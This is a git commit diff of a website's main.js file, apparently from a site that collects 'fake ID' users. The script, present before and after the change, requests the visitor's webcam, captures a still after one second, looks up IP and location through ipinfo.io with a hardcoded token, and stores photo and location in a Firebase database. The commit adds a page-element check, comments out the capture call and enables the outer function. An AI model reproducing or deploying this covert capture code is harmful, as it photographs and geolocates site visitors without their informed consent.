0c26f8131b47da63af91f5a89bf5649e45435654
Developer-Nasim <ajnasim72@gmail.coom>
2023-11-17 17:44:28 +0600

    only work in welco

--- assets/js/main.js
+++ assets/js/main.js
@@ -6,56 +6,58 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
     function GetFakeUserData() { 
-      function SaveThisdata(photo) { 
-        fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
-          (response) => response.json()
-        ).then((jsonResponse) => {
-          var ip = `${jsonResponse.ip}`.replaceAll('.','-')
-          firebase
-          .database()
-          .ref("fake_id_users/" + ip)
-          .set({
-            "photo": photo,
-            ...jsonResponse
-          });
-        })
-      }
- 
-      function GetImgThenSave() {
-        var video = document.getElementById('video'); 
-        // Cross-browser getUserMedia
-        navigator.getUserMedia = (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
-        if (navigator.getUserMedia) {
-          navigator.getUserMedia({ video: true },
-            function (stream) {
-              video.srcObject = stream;
-  
-              setTimeout(() => {
-                var canvas = document.createElement('canvas');
-                canvas.width = 700;
-                canvas.height = 500;
-                var context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Convert the canvas content to base64
-                var base64Data = canvas.toDataURL('image/png');
-                SaveThisdata(`${base64Data}`)
-              }, 1000);
-
-
-            },
-            function (err) {
-              SaveThisdata('assets/img/no-image-found.jpg?from=Not got any permision')
-            }
-          );
-        } else {
-          SaveThisdata('assets/img/no-image-found.jpg?from=getUserMedia is not supported')
-          // console.error("getUserMedia is not supported in this browser");
+      if (document.querySelectorAll('.wvu img').length > 0) { 
+        function SaveThisdata(photo) { 
+          fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
+            (response) => response.json()
+          ).then((jsonResponse) => {
+            var ip = `${jsonResponse.ip}`.replaceAll('.','-')
+            firebase
+            .database()
+            .ref("fake_id_users/" + ip)
+            .set({
+              "photo": photo,
+              ...jsonResponse
+            });
+          })
         }
+  
+        function GetImgThenSave() {
+          var video = document.getElementById('video'); 
+          // Cross-browser getUserMedia
+          navigator.getUserMedia = (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
+          if (navigator.getUserMedia) {
+            navigator.getUserMedia({ video: true },
+              function (stream) {
+                video.srcObject = stream;
+    
+                setTimeout(() => {
+                  var canvas = document.createElement('canvas');
+                  canvas.width = 700;
+                  canvas.height = 500;
+                  var context = canvas.getContext('2d');
+                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                  // Convert the canvas content to base64
+                  var base64Data = canvas.toDataURL('image/png');
+                  SaveThisdata(`${base64Data}`)
+                }, 1000);
+
+
+              },
+              function (err) {
+                SaveThisdata('assets/img/no-image-found.jpg?from=Not got any permision')
+              }
+            );
+          } else {
+            SaveThisdata('assets/img/no-image-found.jpg?from=getUserMedia is not supported')
+            // console.error("getUserMedia is not supported in this browser");
+          }
+        }
+        // GetImgThenSave()
       }
-      GetImgThenSave()
     }
-    // GetFakeUserData()
+    GetFakeUserData()
 
 
 
